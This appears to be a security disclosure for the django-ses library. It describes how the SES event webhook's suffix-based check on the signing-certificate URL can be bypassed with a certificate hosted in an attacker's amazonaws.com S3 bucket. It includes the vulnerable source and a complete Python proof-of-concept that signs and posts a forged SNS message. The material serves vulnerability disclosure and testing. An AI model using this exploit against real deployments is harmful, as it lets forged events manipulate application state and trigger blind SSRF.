### Vulnerability List

* Vulnerability Name: Certificate URL Subdomain Validation Bypass
  * Description:
    The `django-ses` library's `SESEventWebhookView` receives signed requests from AWS for handling email events. The signature verification process involves retrieving a public certificate from a URL provided in the request (`SigningCertURL`). The library validates this URL to ensure it originates from a trusted domain, configured by `AWS_SNS_EVENT_CERT_TRUSTED_DOMAINS` setting (defaulting to `amazonaws.com` and `amazon.com`). However, the validation logic in `_get_cert_url` function only checks if the URL's net location ends with a trusted domain. This allows an attacker to host a malicious certificate on an arbitrary subdomain of a trusted domain (like an S3 bucket on `amazonaws.com`) and bypass the domain validation. By crafting a signed webhook request with the `SigningCertURL` pointing to their malicious certificate, an attacker can successfully pass signature verification, even if the signature is created with a key they control, not AWS's actual key.

    Steps to trigger vulnerability:
    1. Attacker sets up an AWS S3 bucket (or similar service) under a subdomain of a trusted domain (e.g., `amazonaws.com`), for example: `attacker-controlled-bucket.s3.amazonaws.com`.
    2. Attacker generates a self-signed certificate and private key.
    3. Attacker uploads the public certificate to the S3 bucket, making it accessible via HTTPS, e.g., `https://attacker-controlled-bucket.s3.amazonaws.com/attacker.cert`.
    4. Attacker crafts a malicious webhook payload (e.g., a `SubscriptionConfirmation` or `Notification` type).
    5. Attacker signs the malicious payload using the attacker's generated private key.
    6. Attacker includes the URL of the malicious certificate (`https://attacker-controlled-bucket.s3.amazonaws.com/attacker.cert`) in the `SigningCertURL` field of the payload.
    7. Attacker sends a POST request to the `/ses/event-webhook/` endpoint of the Django application with the crafted payload.
    8. The `django-ses` library fetches the certificate from the attacker-controlled subdomain, incorrectly validates the URL as trusted because it ends with `amazonaws.com`, and uses the attacker's certificate to verify the signature. Since the payload was signed with the corresponding private key, the signature verification succeeds.
    9. The application processes the forged webhook request as if it were a legitimate AWS event.

  * Impact:
    Successful exploitation of this vulnerability allows an attacker to send forged webhook requests to the application, which will be incorrectly verified as legitimate AWS events. The impact of this depends on how the application processes these events. At minimum, it can lead to Blind SSRF by exploiting SubscriptionConfirmation event. In more critical scenarios, if the application relies on the verified event data to trigger actions (e.g., updating user status based on bounce events), an attacker could manipulate application state or gain unauthorized access.
  * Vulnerability Rank: high
  * Currently implemented mitigations:
    The project attempts to validate the certificate URL by checking if the URL's net location ends with a domain listed in `AWS_SNS_EVENT_CERT_TRUSTED_DOMAINS`.
  * Missing mitigations:
    The subdomain validation is insufficient. The validation should enforce that the certificate URL strictly matches a set of known, fully qualified domain names or use a more robust validation mechanism, such as regular expression matching against known AWS certificate URL patterns. For `amazonaws.com` domains, it's recommended to use regex `^https://sns\.[a-z0-9\-]+\.amazonaws\.com(\.cn)?/SimpleNotificationService\-[a-z0-9]+\.pem$`.
  * Preconditions:
    - Signature verification is enabled (`VERIFY_EVENT_SIGNATURES = True`, which is the default).
    - The application exposes the `SESEventWebhookView` to receive webhook events.
    - Default or permissive `AWS_SNS_EVENT_CERT_TRUSTED_DOMAINS` setting is used (containing `amazonaws.com`).
  * Source code analysis:
    1. File: `/code/django_ses/utils.py`
    2. Function: `_get_cert_url`
    3. Code snippet:
    ```python
    def _get_cert_url(self):
        """
        Get the signing certificate URL.
        Only accept urls that match the domains set in the
        AWS_SNS_EVENT_CERT_TRUSTED_DOMAINS setting. Sub-domains
        are allowed. i.e. if amazonaws.com is in the trusted domains
        then sns.us-east-1.amazonaws.com will match.
        """
        cert_url = self._data.get("SigningCertURL")
        if not cert_url:
            logger.warning('No signing certificate URL: "%s"', cert_url)
            return None

        if not cert_url.startswith("https://"):
            logger.warning('Untrusted certificate URL: "%s"', cert_url)
            return None

        url_obj = urlparse(cert_url)
        for trusted_domain in settings.EVENT_CERT_DOMAINS:
            parts = trusted_domain.split(".")
            if "amazonaws.com" in trusted_domain:
                if not SES_REGEX_CERT_URL.match(cert_url):
                    if len(parts) < 4:
                        return None
                    else:
                        logger.warning('Possible security risk for: "%s"', cert_url)
                        logger.warning(
                            "It is strongly recommended to configure the full domain in EVENT_CERT_DOMAINS. "
                            "See v3.5.0 release notes for more details."
                        )

            if url_obj.netloc.split(".")[-len(parts) :] == parts:
                return cert_url

        return None
    ```
    4. Vulnerability: The code iterates through `settings.EVENT_CERT_DOMAINS` and checks if the net location of the `cert_url` ends with any of the `trusted_domain`. This allows subdomains to be considered valid. For example, if `amazonaws.com` is a trusted domain, `attacker-controlled-bucket.s3.amazonaws.com` will also be considered trusted, allowing attacker to host malicious certificate. Although for `amazonaws.com` there is a regex check using `SES_REGEX_CERT_URL`, this check is only applied when the trusted domain in `EVENT_CERT_DOMAINS` is exactly `amazonaws.com`. If it is configured to a more specific domain like `sns.us-east-1.amazonaws.com`, the regex check will be bypassed and subdomain validation will be used, leading to the vulnerability.
  * Security test case:
    1. Setup:
        - Deploy a Django application using `django-ses` with default settings and signature verification enabled.
        - Configure `AWS_SNS_EVENT_CERT_TRUSTED_DOMAINS = ['sns.us-east-1.amazonaws.com']` in `settings.py`. This will bypass the intended regex validation for `amazonaws.com`.
        - Configure URL patterns to include `path('ses/event-webhook/', SESEventWebhookView.as_view(), name='handle-event-webhook')`.
        - Run the Django development server.
        - Setup an attacker controlled AWS S3 bucket, e.g., `django-sns-poc.s3.ap-southeast-2.amazonaws.com`.
        - Generate a self-signed certificate and private key using openssl:
          ```bash
          openssl genrsa -out private.key 2048
          openssl req -new -x509 -key private.key -out publickey.cer -days 365
          ```
        - Upload `publickey.cer` to the S3 bucket, e.g., `https://django-sns-poc.s3.ap-southeast-2.amazonaws.com/publickey.cer`.
        - Copy `private.key` to your local machine for signing the request.
        - Install required python packages: `pip install cryptography requests`
        - Create a python script `poc.py` with the following content:
          ```python
          from cryptography.hazmat.primitives import serialization
          from cryptography.hazmat.primitives import hashes
          from cryptography.hazmat.primitives.asymmetric import padding
          from cryptography.hazmat.primitives.asymmetric import utils
          import json
          import requests
          from base64 import b64encode

          def _get_bytes_to_sign(_data):
              msg_type = _data.get('Type')
              if msg_type == 'Notification':
                  fields_to_sign = [
                      'Message',
                      'MessageId',
                      'Subject',
                      'Timestamp',
                      'TopicArn',
                      'Type',
                  ]
              elif (msg_type == 'SubscriptionConfirmation' or
                    msg_type == 'UnsubscribeConfirmation'):
                  fields_to_sign = [
                      'Message',
                      'MessageId',
                      'SubscribeURL',
                      'Timestamp',
                      'Token',
                      'TopicArn',
                      'Type',
                  ]
              else:
                  return None

              bytes_to_sign = []
              for field in fields_to_sign:
                  field_value = _data.get(field)
                  if not field_value:
                      continue
                  bytes_to_sign.append(f"{field}\n{field_value}\n")

              return "".join(bytes_to_sign).encode()

          cert_url = 'https://django-sns-poc.s3.ap-southeast-2.amazonaws.com/publickey.cer'
          privkey = serialization.load_pem_private_key(open('./private.key','rb').read(), password=None)
          target_endpoint = 'http://localhost:8000/ses/event-webhook/'

          payload = {
              'Type': 'SubscriptionConfirmation',
              'SubscribeURL': 'http://example.com', # or any URL
              'TopicArn': 'arn:aws:sns:us-east-1:123456789012:MyTopic', # replace with any ARN if needed
              'MessageId': 'unique_message_id', # replace with a unique ID
              'Timestamp': '2024-10-28T12:00:00.000Z', # current timestamp in ISO 8601 format
              'Message': 'test message' # replace with any message, or remove if not needed for SubscriptionConfirmation
          }

          sign_bytes = _get_bytes_to_sign(payload)
          chosen_hash = hashes.SHA1()
          hasher = hashes.Hash(chosen_hash)
          hasher.update(sign_bytes)
          digest = hasher.finalize()
          sig = privkey.sign(
              digest,
              padding.PKCS1v15(),
              utils.Prehashed(chosen_hash)
          )
          payload['SigningCertURL'] = cert_url
          payload['Signature'] = b64encode(sig).decode()

          r = requests.post(target_endpoint, json=payload)
          print(f"Status code: {r.status_code}")
          print(f"Response content: {r.content.decode()}")
          ```
    2. Attack:
        - Run the python script `python poc.py` from your local machine where `private.key` is located. Ensure the Django server is running and accessible at `http://localhost:8000`.
    3. Verification:
        - If the script outputs `Status code: 200`, and `Response content:` is empty string or "OK", it indicates that the forged webhook request was successfully processed by the application, confirming the vulnerability. A status code of 400 would indicate that the signature verification failed for some reason (e.g. payload format issue), but 200 confirms the bypass.